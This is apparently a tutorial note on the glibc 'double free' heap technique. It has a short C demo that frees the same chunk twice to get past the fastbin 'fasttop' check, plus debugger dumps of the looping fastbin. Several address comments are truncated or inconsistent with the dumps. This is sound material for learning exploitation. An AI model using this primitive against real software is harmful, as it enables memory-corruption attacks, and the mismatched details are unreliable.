---
description: 'https://heap-exploitation.dhavalkapil.com/attacks/double_free.html'
---

# Double Free

{% code-tabs %}
{% code-tabs-item title="doublefree.c" %}
```c
main(){

int *a = malloc(10);     // 0xa04010
int *b = malloc(10);     // 0xa04030
int *c = malloc(10);     // 0xa04050

#mark1

free(a);
free(b);  // To bypass "double free or corruption (fasttop)" check
free(a);  // Double Free !!

#mark2
int *d = malloc(10);     // 0xa0401
int *e = malloc(10);     // 0xa04030
int *f = malloc(10);     // 0xa04010   - Same as 'd' !

#mark3
}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

If we view the bins at the respective comments within the source

#### mark1

```text
─────────────────────[ Fastbins for arena 0x7ffff7dd1b20 ]─────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```

#### mark2

```text
─────────────────────[ Fastbins for arena 0x7ffff7dd1b20 ]─────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  →  [loop detected]
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```

We free the same one twice, causing a loop \(but that's not important\).



